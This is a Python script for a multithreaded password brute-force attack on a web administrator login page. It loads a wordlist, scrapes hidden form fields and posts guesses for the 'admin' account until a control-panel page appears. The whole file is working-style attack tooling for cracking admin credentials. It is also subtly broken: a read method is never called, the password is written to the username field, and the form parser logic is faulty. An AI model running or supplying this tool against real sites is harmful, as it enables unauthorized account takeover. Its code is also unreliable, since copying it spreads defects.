import http.cookiejar
import queue
import threading
import urllib.error
import urllib.parse
import urllib.request
from abc import ABC #Abstract Base Classes 
from html.parser import HTMLParser

# global settings
user_thread = 10
username = "admin"
wordlist_file = "cain.txt"
resume = None

# target settings
# start from a local testing installation before going into the wild
target_url = "http://192.168.112.131/administrator/index.php"
target_post = "http://192.168.112.131/administrator/index.php"

username_field = "username"
password_field = "pswd"

success_check = "Administration - Control Panel"

class BruteParser(HTMLParser, ABC):
    def __init__(self):
        HTMLParser.__init__(self)
        self.tag_results = {}

    def handle_starttag(self, tag, attrs):
        if tag == "input":
            tag_name = None
            for name, value in attrs:
                if name == "name":
                    tag_name = value
                if tag_name:
                    self.tag_results[tag_name] = value 

class Bruter(object):
    def __init__(self, user, words_q):
        self.username = user
        self.password_q = words_q
        self.found = False
        print(f"Finished setting up for: {user}")

    def run_bruteforce(self):
        for thread in range(user_thread):
            t = threading.Thread(target=self.web_bruter)
            t.start()

    def web_bruter(self):
        while not self.password_q.empty() and not self.found:
            brute = self.password_q.get().rstrip()
            jar = http.cookiejar.FileCookieJar("cookies")
            opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
            response = opener.open(target_url)
            page = response.read
            print(f"Trying: {self.username}: {brute} ({self.password_q.qsize()} left)")

            # parse out the hidden fields
            parser = BruteParser()
            parser.feed(page)
            post_tags = parser.tag_results

            # add our username and password fields
            post_tags[username_field] = self.username
            post_tags[username_field] = brute

            login_data = urllib.parse.urlencode(post_tags)
            login_response = opener.open(target_post, login_data)
            login_result = login_response.read()

            if success_check in login_result:
                self.found = True 
                print("[*] Bruteforce successful.")
                print(f"[*] Username: {username}")
                print(f"[*] Password:{brute}")
                print("[*] Waiting for other threads to exit...")

def build_wordlist(word_list_file):
    with open (word_list_file, "r") as l:
        raw_words = [line.rstrip("\n") for line in l]

    found_resume = False
    word_queue = queue.Queue()

    for word in raw_words:
        if resume:
            if found_resume:
                word_queue.put(word)
            else:
                if word == resume:
                    found_resume = True
                    print(f"Resuming wordlist from: {resume}")
        else:
            word_queue.put(word)
    return word_queue

words = build_wordlist(wordlist_file)
bruter_obj = Bruter(username, words)
bruter_obj.run_bruteforce()
